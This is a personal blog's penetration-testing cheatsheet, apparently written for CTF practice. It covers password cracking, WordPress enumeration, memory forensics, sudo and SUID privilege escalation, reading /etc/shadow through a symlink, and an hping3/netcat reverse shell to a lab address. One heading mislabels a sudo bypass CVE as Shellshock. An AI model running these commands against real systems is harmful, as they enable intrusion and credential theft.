
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex" />

  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
          href="http://localhost:1337/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
              media="(prefers-color-scheme: light)"
          href="http://localhost:1337/theme/pygments/emacs.min.css">


  <link rel="stylesheet"
        type="text/css"
        href="http://localhost:1337/theme/stork/stork.css" />

  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">

        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 


      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>











 

<meta name="author" content="Jack69" />
<meta name="description" content="Cracking Crack salted SHA512 hash with john the ripper: john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=&#39;dynamic=sha512($p.$s)&#39; Note: hashes need to be formatted as follow: hash$salt Crack a zip archive: fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip Fingerprinting Wordpress …" />
<meta name="keywords" content="">


  <meta property="og:site_name" content="Jack's Corner"/>
  <meta property="og:title" content="Misc Cheatsheet"/>
  <meta property="og:description" content="Cracking Crack salted SHA512 hash with john the ripper: john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=&#39;dynamic=sha512($p.$s)&#39; Note: hashes need to be formatted as follow: hash$salt Crack a zip archive: fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip Fingerprinting Wordpress …"/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="http://localhost:1337/misc/cheatsheet.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
  <meta property="article:section" content="Cheatsheet"/>
  <meta property="og:image" content="">

  <title>Jack's Corner &ndash; Misc Cheatsheet</title>


</head>
<body >

<aside>
  <div>
    <a href="http://localhost:1337/">
      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
    </a>

    <h1>
      <a href="http://localhost:1337/">Jack's Corner</a>
    </h1>


    <div class="stork">
        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
      <div class="stork-output" data-stork="sitesearch-output"></div>
    </div>


    <ul class="social">
      <li>
        <a class="sc-htb"
           href="https://app.hackthebox.com/profile/177323"
           target="_blank">
          <i class="fa-brands fa-htb"></i>
        </a>
      </li>
      <li>
        <a class="sc-thm"
           href="https://tryhackme.com/p/jack69"
           target="_blank">
          <i class="fa-brands fa-thm"></i>
        </a>
      </li>
    </ul>
  </div>
</aside>
  <main>

<nav>
  <a href="http://localhost:1337/">Home</a>

  <a href="/categories.html">Categories</a>
  <a href="/category/cheatsheet.html">Cheatsheets</a>
  <a href="/personal/goals.html">Goals</a>


</nav>

<article class="single">
  <header>
      
    <h1 id="misc/cheatsheet">Misc Cheatsheet</h1>
    <p>

    </p>
  </header>


  <div>
        <div class="toc col-lg-3 hidden-xs hidden-sm">
            <div id="toc"><ul><li><a class="toc-href" href="#cracking" title="Cracking">Cracking</a></li><li><a class="toc-href" href="#fingerprinting" title="Fingerprinting">Fingerprinting</a><ul><li><a class="toc-href" href="#wordpress" title="Wordpress">Wordpress</a></li><li><a class="toc-href" href="#unix-file-permissions" title="Unix File Permissions">Unix File Permissions</a></li><li><a class="toc-href" href="#unix-bash-file-useful-commands" title="Unix Bash File Useful Commands">Unix Bash File Useful Commands</a></li></ul></li><li><a class="toc-href" href="#forensics_1" title="Forensics">Forensics</a><ul><li><a class="toc-href" href="#volatility" title="Volatility">Volatility</a></li><li><a class="toc-href" href="#linux-processes" title="Linux Processes">Linux Processes</a></li></ul></li><li><a class="toc-href" href="#java_1" title="Java">Java</a></li><li><a class="toc-href" href="#javascript" title="Javascript">Javascript</a><ul><li><a class="toc-href" href="#electron" title="Electron">Electron</a></li></ul></li><li><a class="toc-href" href="#enumeration-linux-fs_1" title="Enumeration: Linux FS">Enumeration: Linux FS</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a><ul><li><a class="toc-href" href="#bash-script-unsafe-arithmetic-expression" title="Bash Script: Unsafe Arithmetic Expression">Bash Script: Unsafe Arithmetic Expression</a></li><li><a class="toc-href" href="#shared-object-injection" title="Shared Object Injection">Shared Object Injection</a></li><li><a class="toc-href" href="#shellshock" title="Shellshock">Shellshock</a></li><li><a class="toc-href" href="#sudo" title="Sudo">Sudo</a></li><li><a class="toc-href" href="#file-and-permissions" title="File and Permissions">File and Permissions</a></li></ul></li><li><a class="toc-href" href="#python-utils_1" title="Python Utils">Python Utils</a></li><li><a class="toc-href" href="#reverse-shells" title="Reverse Shells">Reverse Shells</a></li><li><a class="toc-href" href="#scripting-utilities" title="Scripting Utilities">Scripting Utilities</a><ul><li><a class="toc-href" href="#bash" title="Bash">Bash</a></li></ul></li><li><a class="toc-href" href="#windows_1" title="Windows">Windows</a><ul><li><a class="toc-href" href="#cmd" title="cmd">cmd</a></li></ul></li><li><a class="toc-href" href="#proxmox_1" title="Proxmox">Proxmox</a></li></ul></div>
        </div>
    <h2 id="cracking">Cracking</h2>
<p>Crack salted SHA512 hash with john the ripper:</p>
<div class="highlight"><pre><span></span><code>john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
</code></pre></div>
<p>Note: hashes need to be formatted as follow: </p>
<blockquote>
<p>hash$salt</p>
</blockquote>
<p>Crack a zip archive:</p>
<div class="highlight"><pre><span></span><code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
</code></pre></div>
<h2 id="fingerprinting">Fingerprinting</h2>
<h3 id="wordpress">Wordpress</h3>
<p>Version Enumeration:</p>
<ul>
<li>Check WordPress Meta Generator Tag.</li>
<li>Check the WordPress readme .html/license. txt file</li>
<li>Inspect HTTP response headers for version information (X-Powered-By).</li>
<li>Check the login page for the WordPress version as it is usually displayed.</li>
<li>Check the WordPress REST APl (/wp-json/) and look for the version field in the JSON response.</li>
<li>Analyze JS and CSS files for version information.</li>
<li>Examine the WordPress changelog files with information on version updates.</li>
<li>Look for files like changelog.txt o readme.txt in the WordPress directory.</li>
</ul>
<p>Users Enumeration:</p>
<ul>
<li>Username ID brute force - You can enumerate valid users from a WordPress site by Brute Forcing user IDs (Look for 200 responses): <code>curl -s -I -X GET http://wordpress.com/?author=1</code></li>
<li>You can try to enumerate users by querying the WordPress API on wp-json:  <code>curl http://wordpress/wp-json/wp/v2/users</code></li>
<li>Try logging in on /wp-login.php and analyze the responses to verify if a user exists.</li>
</ul>
<p>Plugin Enumeration:</p>
<ul>
<li><code>curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2</code></li>
</ul>
<p>Theme Enumeration:</p>
<ul>
<li><code>curl -s -X GET https://wordpress.com/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2</code></li>
</ul>
<p>Files &amp; Directories Enumeration:</p>
<ul>
<li>/wp-login.php (This is usually changed to /login.php for security)</li>
<li>/wp-admin/login.php</li>
<li>/wp-admin/wp-login.php</li>
<li>xmlrpc.php</li>
<li>/wp-content - Primary directory used to store plugins and themes.</li>
<li>/wp-content/uploads/ - Directory where uploaded files are stored (Usually prone to directory listing).</li>
<li>/wp-config.php</li>
</ul>
<p>Wordpress Nmap Scripts:</p>
<ul>
<li>http-wordpress-brute - <a href="https://nmap.org/nsedoc/scripts/http-wordpress-brute.html">(see args)</a></li>
<li>http-wordpress-enum - <a href="https://nmap.org/nsedoc/scripts/http-wordpress-enum.html">(see args)</a></li>
<li>http-wordpress-users - <a href="https://nmap.org/nsedoc/scripts/http-wordpress-users.html">(see args)</a></li>
</ul>
<h3 id="unix-file-permissions">Unix File Permissions</h3>
<p>Directory permissions govern the ability to modify the directory contents, including deleting files within it. As the owner of the directory, you have the necessary permissions to modify its contents, which typically includes deleting files within that directory. 
This means you can delete the file regardless of whether you have specific permissions on that file.</p>
<p>However, there are some scenarios where this might not work, such as if the file has the "immutable" attribute set or if there are specific restrictions in place at a higher level (like filesystem-level permissions) that prevent modification or deletion of files within the directory.</p>
<h3 id="unix-bash-file-useful-commands">Unix Bash File Useful Commands</h3>
<p>Get a portion of a file:</p>
<div class="highlight"><pre><span></span><code>file tail -c "$((0x7E8D6 + 1))" | head -c "$((0x8AD5D - 0x7E8D6))" &gt;result
</code></pre></div>
<p>Delete a file which name starts with "--":</p>
<div class="highlight"><pre><span></span><code>rm -- --help // "--" makes rm stop parsing command line options
</code></pre></div>
<h2 id="forensics_1">Forensics</h2>
<h3 id="volatility">Volatility</h3>
<p>Reference: https://blog.onfvp.com/post/volatility-cheatsheet/</p>
<p>True Crypt (vol2) info from memory dump:</p>
<div class="highlight"><pre><span></span><code>vol2 --profile 'Win7SP1x86_23418' -f TrueSecrets.raw truecryptsummary
</code></pre></div>
<p>Search and dump files (vol3):</p>
<div class="highlight"><pre><span></span><code><span class="nx">vol</span><span class="w"> </span><span class="o">-</span><span class="nx">f</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">mem</span><span class="w"> </span><span class="nx">dump</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">windows</span><span class="p">.</span><span class="nx">filescan</span><span class="p">.</span><span class="nx">FileScan</span>

<span class="nx">vol</span><span class="w"> </span><span class="o">-</span><span class="nx">f</span><span class="w"> </span><span class="p">&lt;</span><span class="nx">mem</span><span class="w"> </span><span class="nx">dump</span><span class="p">&gt;</span><span class="w"> </span><span class="nx">windows</span><span class="p">.</span><span class="nx">dumpfiles</span><span class="p">.</span><span class="nx">DumpFiles</span><span class="w"> </span><span class="o">--</span><span class="nx">physaddr</span><span class="w"> </span><span class="p">&lt;</span><span class="kd">addr</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">prev</span><span class="w"> </span><span class="nx">command</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="linux-processes">Linux Processes</h3>
<div class="highlight"><pre><span></span><code><span class="c1">// -e trace= read or write events</span>
<span class="c1">// -xx = hex instead of ascii</span>

<span class="n">strace</span><span class="w"> </span><span class="p">[</span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="nb">trace</span><span class="p">=</span><span class="o">&lt;</span><span class="nb">read</span><span class="o">|</span><span class="nb">write</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="o">-</span><span class="n">xx</span><span class="p">]</span><span class="w"> </span><span class="p">[</span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">&lt;</span><span class="nb">max</span><span class="w"> </span><span class="nb">string</span><span class="w"> </span><span class="nb">length</span><span class="o">&gt;</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">pid</span><span class="o">&gt;</span>
</code></pre></div>
<h2 id="java_1">Java</h2>
<p>Create executable jar:</p>
<div class="highlight"><pre><span></span><code><span class="n">jar</span><span class="w"> </span><span class="n">cvfe</span><span class="w"> </span><span class="n">Payload</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="n">Payload</span><span class="w"> </span><span class="o">*.</span><span class="k">class</span>
</code></pre></div>
<h2 id="javascript">Javascript</h2>
<h3 id="electron">Electron</h3>
<p>Extract packaged application:</p>
<div class="highlight"><pre><span></span><code><span class="nv">npm</span><span class="w"> </span><span class="nv">install</span><span class="w"> </span><span class="nv">asar</span><span class="w"> </span>#<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">installed</span>
<span class="nv">npx</span><span class="w"> </span><span class="nv">asar</span><span class="w"> </span><span class="nv">extract</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">app</span><span class="o">&gt;</span>.<span class="nv">asar</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">destination</span><span class="o">&gt;</span>
</code></pre></div>
<p>Re-pack application:</p>
<div class="highlight"><pre><span></span><code>npx asar pack &lt;source&gt; &lt;app&gt;.asar
</code></pre></div>
<p>Enable dev console in code:</p>
<div class="highlight"><pre><span></span><code>win.webContents.openDevTools();
</code></pre></div>
<p>Setup proxy:</p>
<div class="highlight"><pre><span></span><code><span class="nv">In</span><span class="w"> </span><span class="nv">code</span>:
<span class="w">    </span><span class="nv">app</span>.<span class="nv">commandLine</span>.<span class="nv">appendSwitch</span><span class="ss">(</span><span class="s1">'proxy-server'</span>,<span class="s1">'127.0.0.1:8080'</span><span class="ss">)</span><span class="w"> </span>#<span class="w"> </span><span class="nv">Set</span><span class="w"> </span><span class="nv">proxy</span>
<span class="w">    </span><span class="nv">app</span>.<span class="nv">commandLine</span>.<span class="nv">appendSwitch</span><span class="ss">(</span><span class="s1">'ignore-certificate-errors'</span><span class="ss">)</span><span class="w"> </span>#<span class="w"> </span><span class="k">Do</span><span class="w"> </span><span class="nv">not</span><span class="w"> </span><span class="nv">validate</span><span class="w"> </span><span class="nv">proxy</span><span class="w"> </span><span class="nv">certificate</span>

<span class="nv">or</span>

<span class="o">&gt;</span><span class="w">   </span><span class="nv">electron</span><span class="w"> </span>.<span class="w"> </span><span class="o">--</span><span class="nv">proxy</span><span class="o">-</span><span class="nv">server</span><span class="o">=</span><span class="mi">127</span>.<span class="mi">0</span>.<span class="mi">0</span>.<span class="mi">1</span>:<span class="mi">8080</span><span class="w"> </span><span class="o">--</span><span class="nv">ignore</span><span class="o">-</span><span class="nv">certificate</span><span class="o">-</span><span class="nv">errors</span><span class="w"> </span>
</code></pre></div>
<h2 id="enumeration-linux-fs_1">Enumeration: Linux FS</h2>
<p><a href="https://docs.kernel.org/filesystems/proc.html">/proc Explained</a> </p>
<p>Running command for current process:</p>
<div class="highlight"><pre><span></span><code>/proc/self/cmdline
</code></pre></div>
<p>Environment variables for current process:</p>
<div class="highlight"><pre><span></span><code>/proc/self/environ
</code></pre></div>
<table>
<thead>
<tr>
<th>clear_refs</th>
<th>Clears page referenced bits shown in smaps output</th>
</tr>
</thead>
<tbody>
<tr>
<td>cmdline</td>
<td>Command line arguments</td>
</tr>
<tr>
<td>cpu</td>
<td>Current and last cpu in which it was executed (2.4)(smp)</td>
</tr>
<tr>
<td>cwd</td>
<td>Link to the current working directory</td>
</tr>
<tr>
<td>environ</td>
<td>Values of environment variables</td>
</tr>
<tr>
<td>exe</td>
<td>Link to the executable of this process</td>
</tr>
<tr>
<td>fd</td>
<td>Directory, which contains all file descriptors</td>
</tr>
<tr>
<td>maps</td>
<td>Memory maps to executables and library files (2.4)</td>
</tr>
<tr>
<td>mem</td>
<td>Memory held by this process</td>
</tr>
<tr>
<td>root</td>
<td>Link to the root directory of this process</td>
</tr>
<tr>
<td>stat</td>
<td>Process status</td>
</tr>
<tr>
<td>statm</td>
<td>Process memory status information</td>
</tr>
<tr>
<td>status</td>
<td>Process status in human readable form</td>
</tr>
<tr>
<td>wchan</td>
<td>Present with CONFIG_KALLSYMS=y: it shows the kernel function symbol the task is blocked in - or &ldquo;0&rdquo; if not blocked.</td>
</tr>
<tr>
<td>pagemap</td>
<td>Page table</td>
</tr>
<tr>
<td>stack</td>
<td>Report full stack trace, enable via CONFIG_STACKTRACE</td>
</tr>
<tr>
<td>smaps</td>
<td>An extension based on maps, showing the memory consumption of each mapping and flags associated with it</td>
</tr>
<tr>
<td>smaps_rollup</td>
<td>Accumulated smaps stats for all mappings of the process. This can be derived from smaps, but is faster and more convenient</td>
</tr>
<tr>
<td>numa_maps</td>
<td>An extension based on maps, showing the memory locality and binding policy as well as mem usage (in pages) of each mapping.</td>
</tr>
</tbody>
</table>
<p>All available network interfaces:</p>
<div class="highlight"><pre><span></span><code>/proc/net/arp
</code></pre></div>
<p><a href="https://www.kernel.org/doc/Documentation/ABI/testing/sysfs-class-net">/sys/class explained</a></p>
<p>Network Interface Hardware address:</p>
<div class="highlight"><pre><span></span><code><span class="o">/</span><span class="nx">sys</span><span class="o">/</span><span class="kd">class</span><span class="o">/</span><span class="nx">net</span><span class="o">/</span><span class="p">&lt;</span><span class="k">if</span><span class="p">&gt;</span><span class="o">/</span><span class="nx">address</span>
</code></pre></div>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="bash-script-unsafe-arithmetic-expression">Bash Script: Unsafe Arithmetic Expression</h3>
<p>Unsafe arithmetic expression in bash script can lead to command injection and privilege escalation: <a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">see there</a></p>
<ul>
<li>A script using arithmetic mode can be susceptible to command injection by code variables when attacker has a way to provide malicious values</li>
</ul>
<h3 id="shared-object-injection">Shared Object Injection</h3>
<p>Check for shared object injection entry points using strace. <strong>strace</strong> is a tool used to trace system calls and signals.</p>
<div class="highlight"><pre><span></span><code>strace /usr/local/bin/&lt;binary&gt; 2&gt;&amp;1 | grep -iE "open|access|no such file"
</code></pre></div>
<h3 id="shellshock">Shellshock</h3>
<p>CVE-2019-14287:</p>
<div class="highlight"><pre><span></span><code>sudo -u#-1 /bin/bash
</code></pre></div>
<h3 id="sudo">Sudo</h3>
<ul>
<li>Always check if <strong>secure_path</strong> is set with <em>sudo -l</em>. If not, it's possible to alter PATH environment variable in order to exploit binaries with relative path.</li>
<li>If the user has root privileges on some binary allowing to write/read file contents (es: sudoedit, nano, vim, cat, ...), it's possible to exfiltrate protected content using a symlink:</li>
</ul>
<div class="highlight"><pre><span></span><code>ES: (ALL, ALL) sudoedit /some/path/filename.txt

1. ln -s /etc/shadow /some/path/filename.txt
2. sudoedit /some/path/filename.txt
</code></pre></div>
<ul>
<li>If env_keep+=LD_PRELOAD and env_keep+=LD_LIBRARY_PATH are set, it's possible to compile some malicious code and replace dynamically loaded libraries used by a binary with sudo privileges.<ul>
<li>Note: <strong>LD_PRELOAD</strong> loads a shared object before any others when a program is run. <strong>LD_LIBRARY_PATH</strong> provides a list of directories where shared libraries are searched for first.</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code>//<span class="w"> </span>Get<span class="w"> </span>dynamic<span class="w"> </span>libraries<span class="w"> </span><span class="k">for</span><span class="w"> </span>a<span class="w"> </span>binary
ldd<span class="w"> </span>bin
</code></pre></div>
<h3 id="file-and-permissions">File and Permissions</h3>
<p>Find files/directories with SUID set:</p>
<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>/4000<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\;</span>
find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<p>Find files/directories with GUID set:</p>
<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>/2000<span class="w"> </span><span class="m">2</span>&gt;<span class="w"> </span>/dev/null
find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-g<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<p>Find all writable files and directories:</p>
<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
find<span class="w"> </span>/<span class="w"> </span>-writable<span class="w"> </span>-type<span class="w"> </span>d<span class="w"> </span><span class="m">2</span>&gt;/dev/null
</code></pre></div>
<h2 id="python-utils_1">Python Utils</h2>
<p>Use pdb debugger (<a href="https://docs.python.org/3/library/pdb.html">pdb</a>):</p>
<div class="highlight"><pre><span></span><code>python -m pdb myscript.py
</code></pre></div>
<h2 id="reverse-shells">Reverse Shells</h2>
<p>Reverse shell though <code>hping3</code>:</p>
<div class="highlight"><pre><span></span><code><span class="n">Server</span><span class="p">:</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">hping3</span><span class="w"> </span><span class="o">--</span><span class="n">icmp</span><span class="w"> </span><span class="o">--</span><span class="n">listen</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.108</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>

<span class="n">Client</span><span class="p">:</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">hping3</span><span class="w"> </span><span class="o">--</span><span class="n">icmp</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="mi">512</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1234</span><span class="w"> </span><span class="o">-</span><span class="n">I</span><span class="w"> </span><span class="n">eth1</span><span class="w"> </span><span class="mf">192.168</span><span class="o">.</span><span class="mf">56.108</span>

<span class="n">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">dummymessagetestsudo</span><span class="w"> </span><span class="n">nc</span><span class="o">.</span><span class="n">traditional</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="s1">'192.168.56.108'</span><span class="w"> </span><span class="s1">'8090'</span>
</code></pre></div>
<p>Upgrade shell to TTY when no python available (example: docker container):</p>
<div class="highlight"><pre><span></span><code>SHELL=/bin/bash script -q /dev/null

stty raw -echo &amp;&amp; fg
</code></pre></div>
<h2 id="scripting-utilities">Scripting Utilities</h2>
<h3 id="bash">Bash</h3>
<p>Clear line in console output:</p>
<div class="highlight"><pre><span></span><code>echo -en "\033[2K\r$domain"
</code></pre></div>
<p>Filter string by specified length range:</p>
<div class="highlight"><pre><span></span><code>echo 123 | awk 'length &gt;= 3 &amp;&amp; length &lt;= 32'
</code></pre></div>
<p>wget usage useful when missing curl:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// -q = quiet</span>
<span class="c1">// -O - = output to stdout</span>

<span class="n">wget</span><span class="w"> </span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
</code></pre></div>
<h2 id="windows_1">Windows</h2>
<p>Enable system proxy from <code>regedit</code>:</p>
<p><img alt="windows-proxy-from-registers.png" src="http://localhost:1337/images/misc/misc-cheatsheet/windows-proxy-from-registers.png"/></p>
<h3 id="cmd">cmd</h3>
<p>Recursively search for directory or files:</p>
<div class="highlight"><pre><span></span><code>dir /s foo*
</code></pre></div>
<p>Stop and (re)start service:</p>
<div class="highlight"><pre><span></span><code>sc &lt;stop, start&gt; &lt;servicename&gt;
</code></pre></div>
<p>Add (persistent with flag <code>-P</code>) route:</p>
<div class="highlight"><pre><span></span><code>route -P ADD &lt;subnet&gt; MASK &lt;netmask&gt; &lt;gateway&gt; METRIC &lt;value&gt;
</code></pre></div>
<h2 id="proxmox_1">Proxmox</h2>
<ul>
<li>How to import OVA into Proxmox: <a href="https://i12bretro.github.io/tutorials/0387.html">here</a>.</li>
<li>How to import VMDK (VMWare) into Proxmox: <a href="https://pve.proxmox.com/wiki/Migrate_to_Proxmox_VE#Manual_Migration">here</a>.</li>
</ul>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>